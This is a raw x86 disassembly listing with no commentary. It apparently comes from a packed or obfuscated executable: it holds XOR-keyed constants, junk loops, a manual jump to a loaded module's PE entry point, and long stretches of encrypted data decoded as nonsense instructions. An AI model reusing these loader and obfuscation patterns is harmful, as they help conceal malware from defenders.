  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e644
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x4302dd,0x14
  4098db:	cmp    DWORD PTR ds:0x4302dd,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x4302dd,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42eab3
  40991f:	mov    eax,ds:0x4302dd
  409924:	dec    eax
  409925:	mov    ds:0x4302dd,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x430357
  409934:	or     eax,DWORD PTR ds:0x43035f
  40993a:	mov    ds:0x430357,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e650,0x13
  40994c:	cmp    DWORD PTR ds:0x42e650,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e650,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42eab7
  409979:	mov    ecx,DWORD PTR ds:0x42e650
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e650,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x4302c9,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x4302d9,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x43034f,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x43034f
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x43034f,edi
  4099bf:	cmp    DWORD PTR ds:0x43034f,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x4302bd
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42e947
  4099e8:	cmp    DWORD PTR ds:0x43034f,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x43034f
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x43034f,edi
  409a02:	cmp    DWORD PTR ds:0x43034f,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x43035f,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x4302b5,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x4302b5
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x4302b5,ebx
  409a35:	cmp    DWORD PTR ds:0x4302b5,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42e883
  409a50:	cmp    DWORD PTR ds:0x4302b5,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x4302b5
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x4302b5,ebx
  409a6a:	cmp    DWORD PTR ds:0x4302b5,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e648
  409a7d:	or     DWORD PTR ds:0x42ec4b,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	mov    cs,WORD PTR [ecx-0x23a6da60]
  409a9a:	jle    0x409b1a
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409ab5
  409aa1:	in     eax,0x34
  409aa3:	ins    BYTE PTR es:[edi],dx
  409aa4:	fild   WORD PTR [edi-0x7f50934a]
  409aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aab:	sbb    esp,ecx
  409aad:	cli    
  409aae:	sbb    dl,dh
  409ab0:	mov    cs,WORD PTR [ebx+0x76215937]
  409ab6:	push   edx
  409ab7:	mov    BYTE PTR [esp+ecx*1+0x7bf793e2],bl
  409abe:	xchg   eax,ebx
  409ac0:	jns    0x409a66
  409ac2:	icebp  
  409ac3:	push   0x30
  409ac5:	xor    DWORD PTR [ebx+eiz*4+0x388c7ec0],ebx
  409acc:	std    
  409acd:	enter  0xcdcc,0x5c
  409ad1:	sub    dh,BYTE PTR [esi+eax*4-0x7cade35d]
  409ad8:	jge    0x409ab7
  409ada:	pop    ebx
  409adb:	imul   ecx,DWORD PTR [edi+0x3c465038],0xffffffbd
  409ae2:	mov    DWORD PTR [ecx-0x47],ebx
  409ae5:	jecxz  0x409b4a
  409ae7:	jbe    0x409b13
  409ae9:	sub    BYTE PTR [ebx+0x3e],dl
  409aec:	scas   al,BYTE PTR es:[edi]
  409aed:	xlat   BYTE PTR ds:[ebx]
  409aee:	pop    eax
  409aef:	jg     0x409a74
  409af1:	hlt    
  409af2:	pop    esp
  409af3:	xchg   BYTE PTR [ecx-0x8],bh
  409af6:	push   ebp
  409af7:	pop    eax
  409af8:	out    0xb8,eax
  409afa:	cmp    al,0xbe
  409afc:	lea    ebp,[ecx-0x60]
  409aff:	lea    edx,[edx+0x2faf20a9]
  409b05:	dec    edi
  409b06:	data16 or BYTE PTR [edi-0x59],bl
  409b0a:	adc    eax,0x9aaad88b
  409b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b10:	push   ebp
  409b11:	fsubr  st(0),st
  409b13:	pcmpeqw mm5,mm3
  409b16:	dec    edx
  409b17:	cmp    bh,BYTE PTR [edi-0x5a]
  409b1a:	stos   BYTE PTR es:[edi],al
  409b1b:	jns    0x409ac6
  409b1d:	(bad)  
  409b1e:	stc    
  409b1f:	test   eax,0xfe900ec1
  409b24:	sbb    BYTE PTR [bp+si],cl
  409b27:	or     ecx,DWORD PTR [esi-0x489c48b6]
  409b2d:	adc    BYTE PTR [ecx-0x17c6ade7],ah
  409b33:	mov    ds:0xe634113d,eax
  409b38:	mov    dh,0x47
  409b3a:	xor    esp,edi
  409b3c:	stc    
  409b3d:	sbb    ch,BYTE PTR [esi+ecx*8]
  409b40:	xchg   DWORD PTR [esi-0x31d53f8e],edi
  409b46:	xlat   BYTE PTR ds:[ebx]
  409b47:	pop    ecx
  409b48:	jg     0x409ae8
  409b4a:	arpl   WORD PTR [edx*2+0x3ad0e743],dx
  409b51:	cs clc 
  409b53:	add    esp,DWORD PTR [eax-0x37]
  409b56:	push   ds
  409b57:	push   0xffffff9e
  409b59:	xor    DWORD PTR [ecx+ecx*4],0xffffff81
  409b5d:	pusha  
  409b5e:	push   ds
  409b5f:	int3   
  409b60:	mov    ds:0x313348bd,eax
  409b65:	lahf   
  409b66:	and    ebp,esi
  409b68:	scas   al,BYTE PTR es:[edi]
  409b69:	jbe    0x409bad
  409b6b:	pop    esp
  409b6c:	test   DWORD PTR [eax],esi
  409b6e:	push   ecx
  409b6f:	pop    esp
  409b70:	lods   eax,DWORD PTR ds:[esi]
  409b71:	xor    ah,bl
  409b73:	shl    DWORD PTR [ecx],cl
  409b75:	fimul  DWORD PTR [eax]
  409b77:	fbld   TBYTE PTR ds:0xa6b02c18
  409b7d:	retf   
  409b7e:	cld    
  409b7f:	cmp    al,0x3f
  409b81:	push   ecx
  409b82:	ja     0x409ba9
  409b84:	clc    
  409b85:	push   edx
  409b86:	mov    ebx,0xe0fe3b51
  409b8b:	fwait
  409b8c:	int3   
  409b8d:	adc    dh,0xbf
  409b90:	ret    
  409b91:	adc    al,0x56
  409b93:	(bad)  
  409b94:	pop    eax
  409b95:	mov    ch,0xd
  409b97:	cmc    
  409b98:	dec    edi
  409b99:	shl    DWORD PTR [ecx-0x727ed5bd],0x88
  409ba0:	aaa    
  409ba1:	cmp    eax,0xa3c5da52
  409ba6:	xchg   DWORD PTR [edi],esi
  409ba8:	xor    eax,0xadaf4150
  409bad:	xlat   BYTE PTR ds:[ebx]
  409bae:	sub    al,0x35
  409bb0:	ins    DWORD PTR es:[edi],dx
  409bb1:	call   0xdcb7:0xb56c6702
  409bb8:	pushf  
  409bb9:	test   al,0x76
  409bbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bbc:	sbb    eax,0x51156b6d
  409bc1:	loop   0x409b69
  409bc3:	in     eax,0x68
  409bc5:	mov    eax,ds:0x11bca657
  409bca:	cld    
  409bcb:	test   al,0x8c
  409bcd:	pop    ss
  409bce:	jl     0x409c0d
  409bd0:	mov    ebp,0x9981659f
  409bd5:	sbb    al,0xf5
  409bd7:	or     al,0xbe
  409bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bda:	mov    al,0xfb
  409bdc:	outs   dx,DWORD PTR ds:[esi]
  409bdd:	test   eax,0xfff0a15e
  409be2:	lds    ebp,FWORD PTR [eax+0x61]
  409be5:	dec    edi
  409be6:	daa    
  409be7:	add    eax,0x97a1662e
  409bec:	cs cld 
  409bee:	daa    
  409bef:	aad    0xfe
  409bf1:	retf   
  409bf2:	sahf   
  409bf3:	or     BYTE PTR [edx+ebp*2],al
  409bf6:	outs   dx,BYTE PTR ds:[esi]
  409bf7:	loop   0x409be9
  409bf9:	shl    al,0x8e
  409bfc:	dec    ecx
  409bfd:	push   esi
  409bfe:	mov    esi,DWORD PTR [edx-0x5e29b604]
  409c04:	mov    DWORD PTR [eax-0x10c5e156],edx
  409c0a:	push   ebp
  409c0b:	push   ss
  409c0c:	jbe    0x409be4
  409c0e:	call   esi
  409c10:	icebp  
  409c11:	(bad)  
  409c12:	mov    eax,0x487ee88b
  409c17:	cmp    al,0xd4
  409c19:	push   edx
  409c1a:	fmulp  st(6),st
  409c1c:	sub    al,0xce
  409c1e:	daa    
  409c1f:	std    
  409c20:	xchg   DWORD PTR [eax+0x35c6b9a9],ebx
  409c26:	or     al,0x75
  409c28:	jb     0x409c61
  409c2a:	ins    DWORD PTR es:[edi],dx
  409c2b:	inc    ebx
  409c2c:	inc    edi
  409c2d:	loope  0x409c60
  409c2f:	lods   eax,DWORD PTR ds:[esi]
  409c30:	dec    esi
  409c31:	jb     0x409c96
  409c33:	cli    
  409c34:	push   0xf9da314b
  409c39:	retf   0x3375
  409c3c:	loopne 0x409cbc
  409c3e:	pop    ecx
  409c3f:	cmp    ebx,DWORD PTR [eax-0x2977f85e]
  409c45:	push   0xffffffee
  409c47:	gs icebp 
  409c49:	shl    BYTE PTR [edi*4-0x6c558a5d],cl
  409c50:	mov    ds:0xc3cfa8d3,eax
  409c55:	mov    dh,0xf8
  409c57:	jmp    0x5a34:0xd6d7f7e2
  409c5e:	cmc    
  409c5f:	sbb    BYTE PTR [eax-0xa],0x54
  409c63:	repnz int3 
  409c65:	or     esi,DWORD PTR [eax-0x825a368]
  409c6b:	pop    es
  409c6c:	jns    0x409cb2
  409c6e:	leave  
  409c6f:	out    0x0,eax
  409c71:	xchg   DWORD PTR [edi-0x28baa12e],eax
  409c77:	and    eax,0xa919a15d
  409c7c:	inc    ebx
  409c7d:	and    DWORD PTR [ecx-0x1a],eax
  409c80:	cmp    al,0x11
  409c82:	mov    ds,WORD PTR [esi-0xe]
  409c85:	je     0x409c26
  409c87:	push   ebp
  409c88:	rol    DWORD PTR [eax],cl
  409c8a:	(bad)  
  409c8c:	scas   al,BYTE PTR es:[edi]
  409c8d:	call   0x429d:0xccc430df
  409c94:	out    dx,al
  409c95:	mov    al,0xb7
  409c97:	inc    edi
  409c98:	aas    
  409c99:	stos   DWORD PTR es:[edi],eax
  409c9a:	push   0xffffff90
  409c9c:	aam    0x68
  409c9e:	leave  
  409c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ca0:	add    edx,DWORD PTR [eax*2-0x3a751938]
  409ca7:	xor    ah,BYTE PTR [esi-0x105b61f8]
  409cad:	sbb    dh,BYTE PTR [esi-0x160ba11a]
  409cb3:	fiadd  DWORD PTR [edx]
  409cb5:	ja     0x409c41
  409cb7:	dec    esp
  409cb8:	mov    edx,0xa57ccfea
  409cbd:	push   ebp
  409cbe:	inc    edi
  409cbf:	gs stos BYTE PTR es:[edi],al
  409cc1:	hlt    
  409cc2:	je     0x409c70
  409cc4:	bts    DWORD PTR [eax+0x179b1275],esp
  409ccb:	popf   
  409ccc:	dec    ebx
  409ccd:	daa    
  409cce:	stos   DWORD PTR es:[edi],eax
  409ccf:	shl    DWORD PTR [ecx],1
  409cd1:	loope  0x409d3e
  409cd3:	pop    esp
  409cd4:	mov    dh,0xa1
  409cd6:	pop    esi
  409cd7:	ins    DWORD PTR es:[edi],dx
  409cd8:	dec    DWORD PTR [edx-0x63]
  409cdb:	jb     0x409ccc
  409cdd:	mov    al,0xd6
  409cdf:	mov    ch,0xf
  409ce1:	repnz sub dh,BYTE PTR [edi-0xe]
  409ce5:	dec    ebx
  409ce6:	and    al,0x79
  409ce8:	and    al,0x46
  409cea:	or     BYTE PTR [ebx-0x6c],dh
  409ced:	dec    esi
  409cee:	aam    0x63
  409cf0:	lahf   
  409cf1:	and    eax,0x9de6099e
  409cf6:	mov    cl,0x1c
  409cf8:	mov    edi,0x825b4c84
  409cfd:	mov    cl,BYTE PTR [ebp+0x4fb039ba]
  409d03:	stc    
  409d04:	mov    dl,0xfa
  409d06:	ret    0xf540
  409d09:	outs   dx,BYTE PTR ds:[esi]
  409d0a:	aad    0x55
  409d0c:	xchg   ebx,eax
  409d0d:	push   esi
  409d0e:	stc    
  409d0f:	fsub   st(1),st
  409d11:	inc    ecx
  409d12:	aam    0xdf
  409d14:	or     al,0x5c
  409d16:	sbb    DWORD PTR [eax-0x6],edi
  409d19:	hlt    
  409d1a:	outs   dx,DWORD PTR ds:[esi]
  409d1b:	jp     0x409d9c
  409d1d:	mov    al,0xee
  409d1f:	or     BYTE PTR [eax+esi*1+0xfbce9aa],ah
  409d26:	and    cl,BYTE PTR [eax+edx*8]
  409d29:	sub    ebp,DWORD PTR [ecx+0x634e6635]
  409d2f:	or     edi,esi
  409d31:	xchg   BYTE PTR [ecx+eax*8+0x187db669],bl
  409d38:	enter  0x66c8,0x90
  409d3c:	(bad)  
  409d3d:	sub    BYTE PTR cs:[esi+ebx*4],cl
  409d41:	xchg   edx,esi
  409d43:	out    0x8a,eax
  409d45:	and    BYTE PTR [ebx-0x5456c4ff],bl
  409d4b:	jmp    0x13b1:0x893ce76a
  409d52:	sti    
  409d53:	cld    
  409d54:	fdivr  DWORD PTR ds:0xa331c199
  409d5a:	sbb    BYTE PTR [eax],bh
  409d5c:	adc    bl,0x41
  409d5f:	dec    eax
  409d60:	and    al,0x3
  409d62:	or     ch,BYTE PTR [edx]
  409d64:	sbb    ch,BYTE PTR [edx+edx*8-0x229d4410]
  409d6b:	mov    ebp,0x29258c2b
  409d70:	sub    al,0x5d
  409d72:	(bad)  
  409d73:	out    dx,al
  409d74:	inc    edx
  409d75:	xor    eax,0x2499559e
  409d7a:	ds out dx,al
  409d7c:	cmp    DWORD PTR [eax-0x5a],esp
  409d7f:	imul   ecx,DWORD PTR [edx-0x47],0xd1ea6a62
  409d86:	adc    dl,BYTE PTR [ebx]
  409d88:	and    eax,0x9c3a7c44
  409d8d:	enter  0xf16a,0x67
  409d91:	cli    
  409d92:	data16 mov cl,0x9
  409d95:	adc    DWORD PTR [edi],edi
  409d97:	cs ins DWORD PTR es:[edi],dx
  409d99:	mov    ecx,0xb908f0b4
  409d9e:	jg     0x409d51
  409da0:	or     BYTE PTR [edi+0x3a],bl
  409da3:	mov    edx,0x2de9e5b2
  409da8:	inc    edx
  409da9:	int    0x86
  409dab:	cmp    DWORD PTR [edi-0xd],esi
  409dae:	int    0xd1
  409db0:	stos   BYTE PTR es:[edi],al
  409db1:	add    eax,0x5f51a8e2
  409db6:	and    dh,BYTE PTR [edi+edi*4-0x27]
  409dba:	cmp    al,BYTE PTR ds:0x92059c89
  409dc0:	je     0x409d7b
  409dc2:	jl     0x409d4e
  409dc4:	xor    edi,edi
  409dc6:	test   BYTE PTR [ebx+0x5d],0xe7
  409dca:	or     al,0xd5
  409dcc:	cdq    
  409dcd:	mov    al,0xdc
  409dcf:	pop    es
  409dd0:	add    eax,edi
  409dd2:	mov    ebx,DWORD PTR ds:0x42e658
  409dd8:	add    ebx,DWORD PTR ds:0x430357
  409dde:	mov    DWORD PTR ds:0x42e658,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x4302dd,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x43034f,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x4302d1
  409e03:	and    DWORD PTR ds:0x4302f1,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x4302cd,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409dcb
  409e2b:	inc    ebx
  409e2c:	mov    ch,0x61
  409e2e:	or     eax,ebx
  409e30:	jle    0x409eb0
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409e5b
  409e37:	and    BYTE PTR [edi+eiz*2+0x67],ch
  409e3b:	mov    BYTE PTR [esi+ecx*8],ah
  409e3e:	inc    eax
  409e3f:	cmp    esi,DWORD PTR [ecx+0xf43fadb]
  409e45:	sar    bh,0x2b
  409e48:	test   eax,0xa1a7d3ef
  409e4d:	inc    ecx
  409e4e:	push   ss
  409e4f:	sbb    ecx,ebx
  409e51:	adc    edi,DWORD PTR [ecx-0x21bd7a74]
  409e57:	pop    ebp
  409e58:	loop   0x409e44
  409e5a:	cld    
  409e5b:	aaa    
  409e5c:	mov    esp,0x34461b70
  409e61:	push   edi
  409e62:	daa    
  409e63:	or     eax,0x9282541a
  409e68:	jle    0x409e70
  409e6a:	mov    ds:0xe11cbcf0,al
  409e6f:	pop    edx
  409e70:	test   DWORD PTR [edx+0x47],edi
  409e73:	in     al,dx
  409e74:	test   BYTE PTR [ebx-0x35e8f73d],ah
  409e7a:	adc    ebp,DWORD PTR [ecx]
  409e7c:	gs out dx,eax
  409e7e:	add    DWORD PTR [eax+0x10],edi
  409e81:	stc    
  409e82:	ror    DWORD PTR [ebp+0x11],cl
  409e85:	mov    ebp,0x40d4c2f5
  409e8a:	rcl    ecx,0xf9
  409e8d:	inc    edx
  409e8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e8f:	cmp    DWORD PTR [ebx],edi
  409e91:	xchg   edx,eax
  409e92:	inc    edi
  409e93:	adc    BYTE PTR [edx-0x6a878661],bh
  409e99:	add    eax,0xf46310c1
  409e9e:	push   ds
  409e9f:	inc    eax
  409ea0:	enter  0x60ef,0x63
  409ea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ea5:	mov    ah,0xbb
  409ea7:	or     al,0x69
  409ea9:	push   edi
  409eaa:	and    al,0xe9
  409eac:	mov    ebx,0xf069e629
  409eb1:	mov    ds:0x2ca2d7e6,al
  409eb6:	mov    edi,DWORD PTR [ecx+0x7d9c9538]
  409ebc:	push   ss
  409ebd:	enter  0xc48d,0xc3
  409ec1:	pop    ds
  409ec2:	pusha  
  409ec3:	adc    bl,BYTE PTR [esi]
  409ec5:	hlt    
  409ec6:	ret    
  409ec7:	and    BYTE PTR [edi],ah
  409ec9:	dec    ecx
  409eca:	icebp  
  409ecb:	mov    ds:0x92ce7350,eax
  409ed0:	fs xchg ebp,eax
  409ed2:	push   eax
  409ed3:	hlt    
  409ed4:	dec    ebx
  409ed5:	(bad)
  409ed8:	push   ebx
  409ed9:	sub    al,0xdc
  409edb:	vaddss xmm7,xmm0,DWORD PTR [edx+0x16]
  409ee0:	pusha  
  409ee1:	jae    0x409f17
  409ee3:	push   edi
  409ee4:	sub    al,0xba
  409ee6:	mov    WORD PTR [esi],?
  409ee8:	leave  
  409ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eea:	jp     0x409e7f
  409eec:	hlt    
  409eed:	push   edi
  409eee:	test   DWORD PTR [esi],edx
  409ef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ef1:	nop
  409ef2:	sub    eax,0xb807c537
  409ef7:	std    
  409ef8:	xor    al,0x92
  409efa:	fidivr DWORD PTR [edi-0x16]
  409efd:	imul   ecx,DWORD PTR [esi-0x7a597d4a],0xffffff9b
  409f04:	cmp    al,0x79
  409f06:	mov    WORD PTR [ebp-0x3bda5b0],?
  409f0c:	sbb    DWORD PTR [ebx+0x58],esi
  409f0f:	xchg   ebp,eax
  409f10:	fild   DWORD PTR [ebp+0x9]
  409f13:	xor    BYTE PTR [ecx-0x1c],ch
  409f16:	mov    ds:0xc576ec26,al
  409f1b:	mov    ch,0xa7
  409f1d:	test   cl,ah
  409f1f:	xchg   ebx,eax
  409f20:	pop    esi
  409f21:	out    0x58,al
  409f23:	push   edi
  409f24:	mov    ebp,0x6ab9af86
  409f29:	fild   DWORD PTR [ebx-0x8]
  409f2c:	scas   eax,DWORD PTR es:[edi]
  409f2d:	(bad)  
  409f2e:	je     0x409f07
  409f30:	je     0x409ed0
  409f32:	retf   0x286f
  409f35:	jae    0x409f0d
  409f37:	adc    eax,0x5ab5ddd1
  409f3c:	sahf   
  409f3d:	mov    esi,DWORD PTR [esi+0x2a51f54d]
